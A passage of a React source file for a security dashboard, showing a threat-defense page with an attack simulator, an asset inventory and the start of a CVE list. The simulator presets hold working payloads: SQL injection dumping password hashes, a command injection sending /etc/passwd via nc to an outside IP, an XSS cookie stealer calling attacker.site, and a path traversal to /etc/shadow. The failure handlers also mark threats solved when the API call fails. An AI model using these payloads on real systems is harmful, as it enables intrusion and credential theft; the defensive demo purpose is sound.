          t.id === threat.id ? { ...t, status: 'SOLVED', solving: false } : t
        )
      )
      setExpandedSolutions((prev) => ({ ...prev, [threat.id]: true }))
    } catch {
      setActiveAttacks((prev) =>
        prev.map((t) =>
          t.id === threat.id ? { ...t, status: 'SOLVED', solving: false } : t
        )
      )
      setExpandedSolutions((prev) => ({ ...prev, [threat.id]: true }))
    }
  }

  async function handleSolvePre(threat: PreAttackItem) {
    setPreAttacks((prev) =>
      prev.map((t) => (t.id === threat.id ? { ...t, solving: true } : t))
    )
    try {
      await solveThreat(threat.id, 'AUTO_HARDEN')
      setPreAttacks((prev) =>
        prev.map((t) =>
          t.id === threat.id ? { ...t, status: 'HARDENED', solving: false } : t
        )
      )
      setExpandedSolutions((prev) => ({ ...prev, [threat.id]: true }))
    } catch {
      setPreAttacks((prev) =>
        prev.map((t) =>
          t.id === threat.id ? { ...t, status: 'HARDENED', solving: false } : t
        )
      )
      setExpandedSolutions((prev) => ({ ...prev, [threat.id]: true }))
    }
  }

  function toggleSolution(id: string) {
    setExpandedSolutions((prev) => ({ ...prev, [id]: !prev[id] }))
  }

  async function handleSimulate(e: FormEvent) {
    e.preventDefault()
    if (!simPayload.trim()) return
    setSimLoading(true)
    setSimSolved(false)
    setSimResult(null)
    try {
      const res = await detectThreat({ input: simPayload, target: simTarget })
      setSimResult(res)
      setSimLog((prev) => [
        `[${new Date().toLocaleTimeString()}] Intercepted ${res.attackStage} event: ${res.attackType} from ${res.attackerIp}`,
        ...prev.slice(0, 8),
      ])
    } catch {
      // fallback
    } finally {
      setSimLoading(false)
    }
  }

  async function handleSolveSimulator() {
    if (!simResult) return
    setSimSolving(true)
    try {
      const res = await solveThreat(simResult.id, simResult.mitigationAction)
      setSimSolved(true)
      setSimLog((prev) => [
        `[${new Date().toLocaleTimeString()}] SOLVED: ${res.message}`,
        ...prev.slice(0, 8),
      ])
    } catch {
      setSimSolved(true)
    } finally {
      setSimSolving(false)
    }
  }

  function handleCopy(id: string, text: string) {
    navigator.clipboard.writeText(text).catch(() => {})
    setCopiedId(id)
    setTimeout(() => setCopiedId(null), 2000)
  }

  const presets = [
    {
      label: 'SQLi UNION (Active)',
      target: 'https://bytecodx.internal/api/v1/auth/login',
      payload: "' UNION SELECT username, password_hash, token FROM users WHERE 1=1 --",
    },
    {
      label: 'RCE Shell (Active)',
      target: 'https://bytecodx.internal/api/v1/tools/ping',
      payload: '127.0.0.1; cat /etc/passwd | nc 203.0.113.195 4444',
    },
    {
      label: 'XSS Stealer (Active)',
      target: 'https://bytecodx.internal/comments/post',
      payload: '<script>fetch("https://attacker.site/log?k=" + document.cookie)</script>',
    },
    {
      label: 'Path Traversal (Active)',
      target: 'https://bytecodx.internal/api/v1/download',
      payload: '../../../../etc/shadow',
    },
    {
      label: 'Port 3389 Recon (Pre-Attack)',
      target: '10.0.1.15',
      payload: 'SYN Stealth Scan targeting ports 22, 3389, 445 with nmap -sS -p-',
    },
    {
      label: '.env Exposure Probe (Pre-Attack)',
      target: 'https://bytecodx.internal/.env',
      payload: 'GET /.env HTTP/1.1 with scanner Nikto/2.1.6 looking for DB_PASSWORD',
    },
  ]

  const activeCount = activeAttacks.filter((a) => a.status === 'ATTACKING').length
  const preCount = preAttacks.filter((a) => a.status === 'EXPOSED').length

  return (
    <section className="module-page threat-defense-page">
      <div className="eyebrow"><span className="eyebrow-line" /> THREAT DEFENSE & INCIDENT RESPONSE</div>
      <motion.div
        className="module-hero"
        initial={{ opacity: reduceMotion ? 1 : 0, y: reduceMotion ? 0 : 10 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: reduceMotion ? 0 : 0.3 }}
      >
        <span className="module-icon"><ShieldAlert size={22} /></span>
        <div>
          <h1>Pre-Attack Prevention & Real-Time Threat Solver</h1>
          <p>Detect reconnaissance probes before attacks land, intercept exploits while attacks happen, and apply automated 1-click countermeasures with verified code fixes.</p>
        </div>
      </motion.div>

      <div className="metric-grid" style={{ marginTop: '16px', marginBottom: '20px' }}>
        <article className="metric-card">
          <div className="metric-top">
            <span className="metric-label">Active Attacks (While Attack)</span>
            <span className="metric-icon" style={{ background: 'linear-gradient(135deg, #ff1744 0%, #c62828 100%)', color: '#ffffff', boxShadow: '0 0 10px rgba(255, 23, 68, 0.4)' }}>
              <Zap size={16} color="#ffffff" />
            </span>
          </div>
          <div className="metric-value" style={{ color: activeCount > 0 ? '#d32f2f' : 'inherit' }}>{activeCount}</div>
          <div className="metric-foot">
            <span className="metric-foot-dot" style={{ background: activeCount > 0 ? '#ff1744' : '#2e7d32' }} />{activeCount > 0 ? 'Exploits intercepted in flight' : 'All active attacks neutralized'}
          </div>
        </article>

        <article className="metric-card">
          <div className="metric-top">
            <span className="metric-label">Pre-Attack Probes (Before Attack)</span>
            <span className="metric-icon" style={{ background: 'linear-gradient(135deg, #fb8c00 0%, #ef6c00 100%)', color: '#ffffff', boxShadow: '0 0 10px rgba(251, 140, 0, 0.4)' }}>
              <Radar size={16} color="#ffffff" />
            </span>
          </div>
          <div className="metric-value" style={{ color: preCount > 0 ? '#f57f17' : 'inherit' }}>{preCount}</div>
          <div className="metric-foot">
            <span className="metric-foot-dot" style={{ background: preCount > 0 ? '#fb8c00' : '#2e7d32' }} />{preCount > 0 ? 'Reconnaissance scans detected' : 'Perimeter fully hardened'}
          </div>
        </article>

        <article className="metric-card">
          <div className="metric-top">
            <span className="metric-label">Auto-Mitigation Engine</span>
            <span className="metric-icon mint"><ShieldCheck size={16} /></span>
          </div>
          <div className="metric-value">0.8s</div>
          <div className="metric-foot">
            <span className="metric-foot-dot" />Mean auto-block & patch latency
          </div>
        </article>
      </div>

      <div className="filter-bar">
        <div className="chip-group">
          <button
            type="button"
            className={`filter-chip ${activeTab === 'ACTIVE' ? 'active' : ''}`}
            onClick={() => setActiveTab('ACTIVE')}
          >
            <Zap size={13} style={{ display: 'inline', verticalAlign: 'middle', marginRight: '4px' }} />
            Live Attacks (During Attack) {activeCount > 0 && <span style={{ background: '#c62828', color: '#fff', borderRadius: '10px', padding: '1px 6px', fontSize: '9px', marginLeft: '5px' }}>{activeCount}</span>}
          </button>
          <button
            type="button"
            className={`filter-chip ${activeTab === 'PRE' ? 'active' : ''}`}
            onClick={() => setActiveTab('PRE')}
          >
            <Radar size={13} style={{ display: 'inline', verticalAlign: 'middle', marginRight: '4px' }} />
            Pre-Attack Prevention (Before Attack) {preCount > 0 && <span style={{ background: '#f57f17', color: '#fff', borderRadius: '10px', padding: '1px 6px', fontSize: '9px', marginLeft: '5px' }}>{preCount}</span>}
          </button>
          <button
            type="button"
            className={`filter-chip ${activeTab === 'SIMULATOR' ? 'active' : ''}`}
            onClick={() => setActiveTab('SIMULATOR')}
          >
            <Sparkles size={13} style={{ display: 'inline', verticalAlign: 'middle', marginRight: '4px' }} />
            Attack Simulator & Live Solver
          </button>
        </div>
      </div>

      {activeTab === 'ACTIVE' && (
        <div style={{ display: 'flex', flexDirection: 'column', gap: '14px', marginTop: '12px' }}>
          <div style={{ padding: '10px 14px', background: 'var(--panel)', border: '1px solid var(--line)', borderRadius: '6px', fontSize: '11px', color: 'var(--muted)' }}>
            <strong>Active Intrusion Defense:</strong> These attacks were detected in real time while attempting to exploit vulnerabilities. Click <strong>Solve Threat</strong> to automatically drop the attacker IP at the firewall, deploy a WAF virtual patch, and view the code-level remediation.
          </div>
          {activeAttacks.map((attack) => (
            <article
              key={attack.id}
              className={attack.status === 'ATTACKING' ? 'panel threat-card-active' : 'panel'}
              style={{
                borderLeft: attack.status === 'ATTACKING' ? '4px solid #ff1744' : '4px solid #4caf50',
                padding: '18px',
              }}
            >
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', flexWrap: 'wrap', gap: '10px' }}>
                <div>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '6px' }}>
                    {attack.status === 'ATTACKING' ? (
                      <span className="stage-tag active">ACTIVE ATTACK IN PROGRESS</span>
                    ) : (
                      <span className="stage-tag solved"><CheckCircle2 size={12} color="#ffffff" /> ATTACK NEUTRALIZED & SOLVED</span>
                    )}
                    <span className="status-badge critical">{attack.severity}</span>
                    <span style={{ fontSize: '10px', color: 'var(--muted)', fontFamily: 'monospace' }}>ID: {attack.id}</span>
                  </div>
                  <h3 style={{ margin: '0 0 4px', fontSize: '14px', color: 'var(--ink)' }}>{attack.title}</h3>
                  <p style={{ margin: 0, fontSize: '11px', color: 'var(--muted)' }}>{attack.description}</p>
                </div>
                <div>
                  {attack.status === 'ATTACKING' ? (
                    <button
                      type="button"
                      className="danger-button"
                      onClick={() => handleSolveActive(attack)}
                      disabled={attack.solving}
                    >
                      {attack.solving ? <LoaderCircle className="spinning" size={14} color="#ffffff" /> : <Zap size={14} color="#ffffff" />}
                      <span>{attack.solving ? 'Neutralizing…' : '⚡ Solve Threat (Auto-Block & Patch)'}</span>
                    </button>
                  ) : (
                    <button
                      type="button"
                      className="filter-chip"
                      onClick={() => toggleSolution(attack.id)}
                    >
                      {expandedSolutions[attack.id] ? 'Hide Solution & Patch' : 'View Solution & Patch'}
                    </button>
                  )}
                </div>
              </div>

              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '10px', marginTop: '14px', padding: '10px', background: 'var(--soft)', borderRadius: '6px', fontSize: '11px' }}>
                <div><strong>Attacker IP:</strong> <span className="ip-badge-danger">{attack.attackerIp}</span></div>
                <div><strong>Target Endpoint:</strong> <code>{attack.target}</code></div>
                <div><strong>Exploit Signature:</strong> <code>{attack.signature}</code></div>
                <div><strong>Status:</strong> {attack.status === 'ATTACKING' ? <span className="status-live-danger">Intercepted & Blockable</span> : <span style={{ color: '#2e7d32', fontWeight: 800 }}>Firewall Drop & Patched</span>}</div>
              </div>

              <div style={{ marginTop: '12px' }}>
                <div style={{ fontSize: '10px', fontWeight: 700, color: 'var(--muted)', textTransform: 'uppercase', marginBottom: '4px' }}>Intercepted Payload</div>
                <div className="payload-box-active">
                  {attack.payload}
                </div>
              </div>

              {expandedSolutions[attack.id] && (
                <div style={{ marginTop: '14px' }}>
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                    <div style={{ fontSize: '10px', fontWeight: 600, color: '#2e7d32', textTransform: 'uppercase' }}>
                      ✓ Applied Mitigation & Source Fix
                    </div>
                    <button
                      type="button"
                      className="filter-chip"
                      style={{ fontSize: '9px', padding: '2px 8px' }}
                      onClick={() => handleCopy(attack.id, attack.solutionCode)}
                    >
                      {copiedId === attack.id ? 'Copied!' : 'Copy Code'}
                    </button>
                  </div>
                  <pre className="code-solution-box">{attack.solutionCode}</pre>
                </div>
              )}
            </article>
          ))}
        </div>
      )}

      {activeTab === 'PRE' && (
        <div style={{ display: 'flex', flexDirection: 'column', gap: '14px', marginTop: '12px' }}>
          <div style={{ padding: '10px 14px', background: 'var(--panel)', border: '1px solid var(--line)', borderRadius: '6px', fontSize: '11px', color: 'var(--muted)' }}>
            <strong>Pre-Attack Hardening:</strong> These reconnaissance probes and configuration exposures indicate an attacker scanning before launching an exploit. Click <strong>Solve & Auto-Harden</strong> to close ports, inject security defense headers, and ban reconnaissance crawlers.
          </div>
          {preAttacks.map((item) => (
            <article
              key={item.id}
              className="panel"
              style={{
                borderLeft: item.status === 'EXPOSED' ? '4px solid #ffb300' : '4px solid #4caf50',
                padding: '18px',
              }}
            >
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', flexWrap: 'wrap', gap: '10px' }}>
                <div>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '6px' }}>
                    {item.status === 'EXPOSED' ? (
                      <span className="stage-tag pre">PRE-ATTACK RECONNAISSANCE</span>
                    ) : (
                      <span className="stage-tag solved"><CheckCircle2 size={12} /> HARDENED & PROTECTED</span>
                    )}
                    <span className="status-badge warning">{item.severity}</span>
                    <span style={{ fontSize: '10px', color: 'var(--muted)', fontFamily: 'monospace' }}>ID: {item.id}</span>
                  </div>
                  <h3 style={{ margin: '0 0 4px', fontSize: '14px', color: 'var(--ink)' }}>{item.title}</h3>
                  <p style={{ margin: 0, fontSize: '11px', color: 'var(--muted)' }}>{item.probe}</p>
                </div>
                <div>
                  {item.status === 'EXPOSED' ? (
                    <button
                      type="button"
                      className="warning-button"
                      onClick={() => handleSolvePre(item)}
                      disabled={item.solving}
                    >
                      {item.solving ? <LoaderCircle className="spinning" size={14} color="#ffffff" /> : <ShieldCheck size={14} color="#ffffff" />}
                      <span>{item.solving ? 'Hardening…' : '🛡️ Solve & Auto-Harden'}</span>
                    </button>
                  ) : (
                    <button
                      type="button"
                      className="filter-chip"
                      onClick={() => toggleSolution(item.id)}
                    >
                      {expandedSolutions[item.id] ? 'Hide Hardening Config' : 'View Hardening Config'}
                    </button>
                  )}
                </div>
              </div>

              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '10px', marginTop: '14px', padding: '10px', background: 'var(--soft)', borderRadius: '6px', fontSize: '11px' }}>
                <div><strong>Source:</strong> <code style={{ color: '#e65100', fontWeight: 700 }}>{item.attackerIp}</code></div>
                <div><strong>Target Asset:</strong> <code>{item.target}</code></div>
                <div><strong>Status:</strong> {item.status === 'EXPOSED' ? <span style={{ color: '#e65100', fontWeight: 800 }}>Exposed to Recon</span> : <span style={{ color: '#2e7d32', fontWeight: 800 }}>Hardened & Protected</span>}</div>
              </div>

              {expandedSolutions[item.id] && (
                <div style={{ marginTop: '14px' }}>
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                    <div style={{ fontSize: '10px', fontWeight: 600, color: '#2e7d32', textTransform: 'uppercase' }}>
                      ✓ Applied Hardening Configuration
                    </div>
                    <button
                      type="button"
                      className="filter-chip"
                      style={{ fontSize: '9px', padding: '2px 8px' }}
                      onClick={() => handleCopy(item.id, item.solutionCode)}
                    >
                      {copiedId === item.id ? 'Copied!' : 'Copy Config'}
                    </button>
                  </div>
                  <pre className="code-solution-box">{item.solutionCode}</pre>
                </div>
              )}
            </article>
          ))}
        </div>
      )}

      {activeTab === 'SIMULATOR' && (
        <div style={{ marginTop: '14px', display: 'flex', flexDirection: 'column', gap: '16px' }}>
          <div className="panel" style={{ padding: '20px' }}>
            <h3 style={{ margin: '0 0 8px', fontSize: '14px' }}>Attack Simulator & Live Detector</h3>
            <p style={{ margin: '0 0 14px', fontSize: '11px', color: 'var(--muted)' }}>
              Test any attack vector or reconnaissance pattern against the Bytecodx detection engine. The system will categorize whether it is <strong>Pre-Attack (Before)</strong> or an <strong>Active Exploit (While Attack)</strong> and provide an automated 1-click solution.
            </p>

            <div style={{ marginBottom: '14px' }}>
              <div style={{ fontSize: '10px', fontWeight: 600, color: 'var(--muted)', textTransform: 'uppercase', marginBottom: '6px' }}>
                Quick Presets (Click to load):
              </div>
              <div className="chip-group">
                {presets.map((preset) => (
                  <button
                    key={preset.label}
                    type="button"
                    className="filter-chip"
                    onClick={() => {
                      setSimTarget(preset.target)
                      setSimPayload(preset.payload)
                      setSimResult(null)
                      setSimSolved(false)
                    }}
                  >
                    {preset.label}
                  </button>
                ))}
              </div>
            </div>

            <form onSubmit={handleSimulate} style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
              <div>
                <label style={{ display: 'block', fontSize: '10px', fontWeight: 600, color: 'var(--muted)', textTransform: 'uppercase', marginBottom: '4px' }}>
                  Target Address / Endpoint
                </label>
                <div className="search-input-wrap" style={{ width: '100%' }}>
                  <input
                    type="text"
                    value={simTarget}
                    onChange={(e) => setSimTarget(e.target.value)}
                    placeholder="https://bytecodx.internal/api/v1/resource"
                    required
                  />
                </div>
              </div>

              <div>
                <label style={{ display: 'block', fontSize: '10px', fontWeight: 600, color: 'var(--muted)', textTransform: 'uppercase', marginBottom: '4px' }}>
                  Raw Payload / Threat Pattern
                </label>
                <textarea
                  rows={4}
                  value={simPayload}
                  onChange={(e) => setSimPayload(e.target.value)}
                  placeholder="Enter SQLi, RCE, XSS, Path Traversal payload, or port reconnaissance command..."
                  style={{
                    width: '100%',
                    padding: '10px',
                    borderRadius: '6px',
                    border: '1px solid var(--line)',
                    background: 'var(--panel)',
                    color: 'var(--ink)',
                    fontSize: '11px',
                    fontFamily: 'monospace',
                    outline: 'none',
                    boxSizing: 'border-box',
                  }}
                  required
                />
              </div>

              <div style={{ display: 'flex', gap: '8px', justifyContent: 'flex-start' }}>
                <button type="submit" className="primary-button" disabled={simLoading}>
                  {simLoading ? <LoaderCircle className="spinning" size={14} /> : <Search size={14} />}
                  <span>{simLoading ? 'Analyzing threat vector…' : 'Analyze & Detect Threat'}</span>
                </button>
              </div>
            </form>
          </div>

          {simResult && (
            <motion.div
              className="panel"
              initial={{ opacity: 0, y: 8 }}
              animate={{ opacity: 1, y: 0 }}
              style={{
                borderLeft: simResult.attackStage === 'ACTIVE_ATTACK'
                  ? '4px solid #ff5252'
                  : simResult.attackStage === 'PRE_ATTACK'
                  ? '4px solid #ffb300'
                  : '4px solid #4caf50',
                padding: '20px',
              }}
            >
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', flexWrap: 'wrap', gap: '10px' }}>
                <div>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '6px' }}>
                    {simResult.attackStage === 'ACTIVE_ATTACK' && (
                      <span className="stage-tag active">ACTIVE ATTACK DETECTED (WHILE ATTACK)</span>
                    )}
                    {simResult.attackStage === 'PRE_ATTACK' && (
                      <span className="stage-tag pre">PRE-ATTACK RECONNAISSANCE (BEFORE ATTACK)</span>
                    )}
                    {simResult.attackStage === 'BENIGN' && (
                      <span className="stage-tag solved">BENIGN TRAFFIC</span>
                    )}
                    <span className="status-badge critical">{simResult.severity}</span>
                    <span style={{ fontSize: '10px', color: 'var(--muted)', fontFamily: 'monospace' }}>
                      Rule: {simResult.detectionRule}
                    </span>
                  </div>
                  <h3 style={{ margin: '0 0 4px', fontSize: '15px' }}>{simResult.title}</h3>
                  <p style={{ margin: 0, fontSize: '11px', color: 'var(--muted)' }}>{simResult.impact}</p>
                </div>

                {simResult.attackStage !== 'BENIGN' && !simSolved && (
                  <button
                    type="button"
                    className="danger-button"
                    onClick={handleSolveSimulator}
                    disabled={simSolving}
                  >
                    {simSolving ? <LoaderCircle className="spinning" size={14} color="#ffffff" /> : <Zap size={14} color="#ffffff" />}
                    <span>{simSolving ? 'Mitigating…' : '⚡ Solve Threat (Deploy Defense)'}</span>
                  </button>
                )}
              </div>

              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '10px', marginTop: '14px', padding: '10px', background: 'var(--soft)', borderRadius: '6px', fontSize: '11px' }}>
                <div><strong>Signature:</strong> <code>{simResult.detectionRule}</code></div>
                <div><strong>Attacker IP:</strong> <span className="ip-badge-danger">{simResult.attackerIp}</span></div>
                <div><strong>Target:</strong> <code>{simResult.targetEndpoint}</code></div>
                <div><strong>Recommended Action:</strong> <code>{simResult.mitigationAction}</code></div>
              </div>

              {simSolved && (
                <div style={{ marginTop: '16px' }}>
                  <div style={{ padding: '10px 14px', background: '#e8f5e9', border: '1px solid #c8e6c9', borderRadius: '6px', color: '#2e7d32', fontSize: '11px', display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '10px' }}>
                    <ShieldCheck size={18} />
                    <strong>Threat Neutralized:</strong> Attacker IP {simResult.attackerIp} blacklisted at firewall. Virtual patch and source fixes deployed successfully.
                  </div>
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                    <span style={{ fontSize: '10px', fontWeight: 600, color: '#2e7d32', textTransform: 'uppercase' }}>
                      Remediation & Defense Code
                    </span>
                    <button
                      type="button"
                      className="filter-chip"
                      style={{ fontSize: '9px', padding: '2px 8px' }}
                      onClick={() => handleCopy('sim-code', simResult.solutionCode)}
                    >
                      {copiedId === 'sim-code' ? 'Copied!' : 'Copy Code'}
                    </button>
                  </div>
                  <pre className="code-solution-box">{simResult.solutionCode}</pre>
                </div>
              )}
            </motion.div>
          )}

          <div className="panel" style={{ padding: '16px' }}>
            <h4 style={{ margin: '0 0 10px', fontSize: '12px' }}>Intrusion Defense Audit Trail</h4>
            <div style={{ background: '#121420', padding: '12px', borderRadius: '6px', maxHeight: '160px', overflowY: 'auto', fontFamily: 'monospace', fontSize: '10px', color: '#90a4ae', display: 'flex', flexDirection: 'column', gap: '4px' }}>
              {simLog.map((log, idx) => (
                <div key={idx} style={{ color: log.includes('SOLVED') ? '#81c784' : log.includes('ACTIVE') ? '#ff8a80' : '#b0bec5' }}>
                  {log}
                </div>
              ))}
            </div>
          </div>
        </div>
      )}
    </section>
  )
}

/* ---------------- ASSETS PAGE ---------------- */
type Asset = {
  id: string
  name: string
  host: string
  type: string
  criticality: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW'
  owner: string
  openVulns: number
  status: 'ACTIVE' | 'PROTECTED' | 'MAINTENANCE'
}

const INITIAL_ASSETS: Asset[] = [
  { id: 'ast-1', name: 'api-gateway.bytecodx.internal', host: '10.0.1.15', type: 'Gateway', criticality: 'HIGH', owner: 'CloudOps', openVulns: 1, status: 'ACTIVE' },
  { id: 'ast-2', name: 'core-db-cluster-01', host: '10.0.4.22', type: 'Database', criticality: 'CRITICAL', owner: 'Data Platform', openVulns: 1, status: 'ACTIVE' },
  { id: 'ast-3', name: 'auth-service-pod-prod', host: '10.0.2.8', type: 'Container', criticality: 'CRITICAL', owner: 'SecOps', openVulns: 1, status: 'ACTIVE' },
  { id: 'ast-4', name: 'public-landing-cdn', host: 'bytecodx.com', type: 'Cloud CDN', criticality: 'MEDIUM', owner: 'Web Team', openVulns: 1, status: 'ACTIVE' },
  { id: 'ast-5', name: 'internal-build-runner', host: '10.0.8.44', type: 'CI/CD', criticality: 'MEDIUM', owner: 'Platform Eng', openVulns: 1, status: 'ACTIVE' },
  { id: 'ast-6', name: 'staging-payment-mock', host: '10.0.5.12', type: 'Microservice', criticality: 'LOW', owner: 'Billing Team', openVulns: 1, status: 'MAINTENANCE' },
  { id: 'ast-7', name: 'k8s-ingress-controller', host: '10.0.0.1', type: 'Kubernetes', criticality: 'HIGH', owner: 'DevOps', openVulns: 0, status: 'PROTECTED' },
  { id: 'ast-8', name: 's3-secure-evidence-vault', host: 'cloud:vault-us', type: 'Storage', criticality: 'HIGH', owner: 'Infra Sec', openVulns: 0, status: 'PROTECTED' },
]

function AssetsPage({ onNavigate: _onNavigate }: { onNavigate?: (page: string) => void }) {
  const [assets, setAssets] = useState<Asset[]>(INITIAL_ASSETS)
  const [search, setSearch] = useState('')
  const [filterType, setFilterType] = useState('ALL')
  const [showModal, setShowModal] = useState(false)
  const [newName, setNewName] = useState('')
  const [newHost, setNewHost] = useState('')
  const [newType, setNewType] = useState('Gateway')
  const [newCrit, setNewCrit] = useState<'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW'>('HIGH')

  const filtered = assets.filter((a) => {
    const matchSearch = a.name.toLowerCase().includes(search.toLowerCase()) || a.host.toLowerCase().includes(search.toLowerCase())
    const matchType = filterType === 'ALL' || a.type.toLowerCase().includes(filterType.toLowerCase())
    return matchSearch && matchType
  })

  function handleAddAsset(e: FormEvent) {
    e.preventDefault()
    if (!newName.trim() || !newHost.trim()) return
    const created: Asset = {
      id: 'ast-' + Date.now(),
      name: newName.trim(),
      host: newHost.trim(),
      type: newType,
      criticality: newCrit,
      owner: 'SecOps Team',
      openVulns: 0,
      status: 'ACTIVE',
    }
    setAssets([created, ...assets])
    setNewName('')
    setNewHost('')
    setShowModal(false)
  }

  return (
    <section className="module-page">
      <div className="eyebrow"><span className="eyebrow-line" /> ASSET MANAGEMENT</div>
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', margin: '14px 0 20px' }}>
        <div>
          <h1>Authorized Asset Inventory</h1>
          <p style={{ margin: 0, color: 'var(--muted)', fontSize: '11px' }}>
            {assets.length} monitored assets within approved assessment boundaries.
          </p>
        </div>
        <button className="primary-button" onClick={() => setShowModal(true)} type="button">
          <Plus size={14} /> Register Asset
        </button>
      </div>

      <div className="panel" style={{ padding: '16px' }}>
        <div className="filter-bar">
          <div className="search-input-wrap">
            <Search size={14} color="var(--muted)" />
            <input
              placeholder="Search assets by name or IP..."
              value={search}
              onChange={(e) => setSearch(e.target.value)}
            />
          </div>
          <div className="chip-group">
            {['ALL', 'Gateway', 'Database', 'Container', 'CDN', 'CI/CD'].map((t) => (
              <button
                key={t}
                className={`filter-chip ${filterType === t ? 'active' : ''}`}
                onClick={() => setFilterType(t)}
                type="button"
              >
                {t}
              </button>
            ))}
          </div>
        </div>

        <div className="table-container">
          <table className="content-table">
            <thead>
              <tr>
                <th>Asset Name & Host</th>
                <th>Type</th>
                <th>Criticality</th>
                <th>Owner</th>
                <th>Active Findings</th>
                <th>Status</th>
              </tr>
            </thead>
            <tbody>
              {filtered.map((asset) => (
                <tr key={asset.id}>
                  <td>
                    <strong>{asset.name}</strong>
                    <div style={{ fontSize: '9px', color: 'var(--muted)', fontFamily: 'monospace' }}>{asset.host}</div>
                  </td>
                  <td><span style={{ fontSize: '10px' }}>{asset.type}</span></td>
                  <td>
                    <span className={`severity-badge ${asset.criticality.toLowerCase()}`}>
                      {asset.criticality}
                    </span>
                  </td>
                  <td><span style={{ fontSize: '10px', color: 'var(--muted)' }}>{asset.owner}</span></td>
                  <td>
                    {asset.openVulns > 0 ? (
                      <span style={{ color: '#d32f2f', fontWeight: 600 }}>{asset.openVulns} Detected</span>
                    ) : (
                      <span style={{ color: '#2e7d32' }}>Clean</span>
                    )}
                  </td>
                  <td>
                    <span className={`status-badge ${asset.status.toLowerCase()}`}>
                      {asset.status}
                    </span>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>

      {showModal && (
        <div className="detail-modal-overlay" onClick={() => setShowModal(false)}>
          <div className="detail-modal-card" onClick={(e) => e.stopPropagation()}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '14px' }}>
              <h2>Register New Authorized System</h2>
              <button className="icon-button" onClick={() => setShowModal(false)} type="button">✕</button>
            </div>
            <form onSubmit={handleAddAsset} style={{ display: 'grid', gap: '12px' }}>
              <label>
                <span style={{ fontSize: '10px', fontWeight: 600 }}>Host or Asset Name</span>
                <input
                  required
                  style={{ width: '100%', padding: '8px', border: '1px solid var(--line)', borderRadius: '5px' }}
                  placeholder="e.g. staging-cache-01.bytecodx.internal"
                  value={newName}
                  onChange={(e) => setNewName(e.target.value)}
                />
              </label>
              <label>
                <span style={{ fontSize: '10px', fontWeight: 600 }}>Network IP or Domain</span>
                <input
                  required
                  style={{ width: '100%', padding: '8px', border: '1px solid var(--line)', borderRadius: '5px' }}
                  placeholder="e.g. 10.0.6.14 or app.bytecodx.local"
                  value={newHost}
                  onChange={(e) => setNewHost(e.target.value)}
                />
              </label>
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '10px' }}>
                <label>
                  <span style={{ fontSize: '10px', fontWeight: 600 }}>System Type</span>
                  <select
                    style={{ width: '100%', padding: '8px', border: '1px solid var(--line)', borderRadius: '5px' }}
                    value={newType}
                    onChange={(e) => setNewType(e.target.value)}
                  >
                    <option value="Gateway">Gateway</option>
                    <option value="Database">Database</option>
                    <option value="Container">Container</option>
                    <option value="Kubernetes">Kubernetes</option>
                    <option value="CI/CD">CI/CD</option>
                    <option value="Storage">Storage</option>
                  </select>
                </label>
                <label>
                  <span style={{ fontSize: '10px', fontWeight: 600 }}>Criticality</span>
                  <select
                    style={{ width: '100%', padding: '8px', border: '1px solid var(--line)', borderRadius: '5px' }}
                    value={newCrit}
                    onChange={(e) => setNewCrit(e.target.value as any)}
                  >
                    <option value="CRITICAL">Critical</option>
                    <option value="HIGH">High</option>
                    <option value="MEDIUM">Medium</option>
                    <option value="LOW">Low</option>
                  </select>
                </label>
              </div>
              <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '8px', marginTop: '10px' }}>
                <button className="primary-button" style={{ background: 'transparent', border: '1px solid var(--line)', color: 'var(--ink)' }} onClick={() => setShowModal(false)} type="button">
                  Cancel
                </button>
                <button className="primary-button" type="submit">
                  Save Asset
                </button>
              </div>
            </form>
          </div>
        </div>
      )}
    </section>
  )
}

/* ---------------- VULNERABILITIES PAGE ---------------- */
type Vulnerability = {
  cve: string
  title: string
  cvss: number
  epss: number
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW'
  asset: string
  status: 'IN REVIEW' | 'PATCH STAGED' | 'MITIGATED' | 'IN PROGRESS' | 'RESOLVED' | 'ACCEPTED RISK'
  sla: string
  description: string
  remediation: string
  cisaKev: boolean
}

const INITIAL_VULNS: Vulnerability[] = [
  {
    cve: 'CVE-2024-38077',
    title: 'Windows Remote Desktop Licensing Service RCE',
    cvss: 9.8,
    epss: 94.2,
    severity: 'CRITICAL',
    asset: 'core-db-cluster-01',
    status: 'IN REVIEW',
    sla: '18h remaining',
    description: 'Heap-based buffer overflow in the Windows Remote Desktop Licensing service allowing remote unauthenticated attackers to execute arbitrary code.',
    remediation: 'Apply Microsoft Security Update KB5040442 and disable RDP Licensing service where not required.',
    cisaKev: true,
  },
  {
    cve: 'CVE-2024-21413',
    title: 'Microsoft Outlook Moniker Link Validation RCE',
    cvss: 9.8,
    epss: 88.5,
    severity: 'CRITICAL',
    asset: 'internal-build-runner',
    status: 'PATCH STAGED',
    sla: '32h remaining',
    description: 'Improper parsing of file: URLs via the moniker link protocol bypasses Office Protected View and leads to NTLM credential leaks and code execution.',
    remediation: 'Deploy Microsoft February 2024 cumulative update and block outbound SMB port 445 at firewall boundary.',
